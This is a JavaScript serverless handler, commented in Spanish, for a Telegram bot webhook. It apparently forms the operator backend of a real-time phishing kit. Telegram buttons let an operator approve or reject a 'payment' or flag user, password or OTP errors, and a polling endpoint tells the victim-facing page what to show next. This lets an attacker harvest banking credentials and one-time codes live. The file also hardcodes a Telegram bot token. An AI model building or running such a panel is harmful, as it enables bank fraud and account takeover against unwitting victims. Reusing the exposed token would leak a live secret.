// No necesitas instalar nada extra, Vercel incluye fetch nativo

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Almacenamiento temporal (en producción usa una base de datos real)
// Esto es solo para demo - en producción usa Redis, Firebase, etc.
if (!global.solicitudes) {
    global.solicitudes = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // RUTA: POST /api/webhook - Recibe actualizaciones de Telegram
    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('📨 Update recibido:', JSON.stringify(update));

            // Verificar si es un callback query (botón presionado)
            if (update.callback_query) {
                const callbackData = update.callback_query.data;
                const callbackId = update.callback_query.id;
                const message = update.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                // ========== MODIFICACIÓN 1: Extraer acción y solicitudId ==========
                let action, solicitudId, respuestaTexto, estadoMensaje;

                if (callbackData.startsWith('approve_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
                } else if (callbackData.startsWith('reject_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                } else if (callbackData.startsWith('user_error_')) {
                    action = 'user_error';
                    solicitudId = callbackData.replace('user_error_', '');
                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                } else if (callbackData.startsWith('pass_error_')) {
                    action = 'pass_error';
                    solicitudId = callbackData.replace('pass_error_', '');
                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                } else if (callbackData.startsWith('otp_error_')) {
                    action = 'otp_error';
                    solicitudId = callbackData.replace('otp_error_', '');
                    respuestaTexto = '❌ Error de OTP - Código inválido';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
                } else {
                    // Fallback para mantener compatibilidad
                    const parts = callbackData.split('_');
                    action = parts[0] || 'unknown';
                    solicitudId = parts.slice(1).join('_') || 'unknown';
                    respuestaTexto = 'Acción procesada';
                    estadoMensaje = 'Procesado';
                }
                // ========== FIN MODIFICACIÓN 1 ==========

                // Responder al callback query inmediatamente
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuestaTexto,  // ========== MODIFICACIÓN 2: Usar variable ==========
                        show_alert: false
                    })
                });

                // Actualizar el mensaje en Telegram
                const newText = originalText.replace(
                    '⏳ *Estado:* Esperando verificación...',
                    `⏳ *Estado:* ${estadoMensaje}`  // ========== MODIFICACIÓN 3: Usar variable ==========
                );

                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                // Guardar el estado de la solicitud
                global.solicitudes.set(solicitudId, {
                    estado: action,  // ========== MODIFICACIÓN 4: Guardar acción real ==========
                    timestamp: Date.now(),
                    chatId: chatId,
                    messageId: messageId
                });

                console.log(`✅ Solicitud ${solicitudId}: ${action}`);  // ========== MODIFICACIÓN 5: Log mejorado ==========

                return res.status(200).json({ 
                    success: true, 
                    action: action,  // ========== MODIFICACIÓN 6: Incluir acción ==========
                    solicitudId: solicitudId,  // ========== MODIFICACIÓN 7: Incluir ID ==========
                    message: `Solicitud ${solicitudId}: ${action}` 
                });
            }

            // Si es un mensaje normal, ignorar
            return res.status(200).json({ success: true, message: 'Update recibido' });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    // RUTA: GET /api/webhook?check=solicitudId - El frontend consulta el estado
    if (req.method === 'GET') {
        const { check, setup } = req.query;

        // Configurar el webhook (se hace una sola vez)
        if (setup === 'true') {
            try {
                // Obtener la URL base de la solicitud
                const baseUrl = `https://${req.headers.host}`;
                const webhookUrl = `${baseUrl}/api/webhook`;

                console.log('🔗 Configurando webhook en:', webhookUrl);

                const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                console.log('✅ Webhook configurado:', data);

                return res.status(200).json({
                    success: true,
                    message: 'Webhook configurado exitosamente',
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ error: 'Error configurando webhook' });
            }
        }

        // Verificar estado de una solicitud
        if (check) {
            const solicitudId = check;
            const solicitud = global.solicitudes.get(solicitudId);

            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: solicitud.estado,
                    timestamp: solicitud.timestamp
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: 'pending',
                    mensaje: 'Solicitud aún no procesada'
                });
            }
        }

        // Obtener info del webhook
        try {
            const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
            const data = await response.json();
            return res.status(200).json(data);
        } catch (error) {
            return res.status(500).json({ error: 'Error obteniendo info del webhook' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
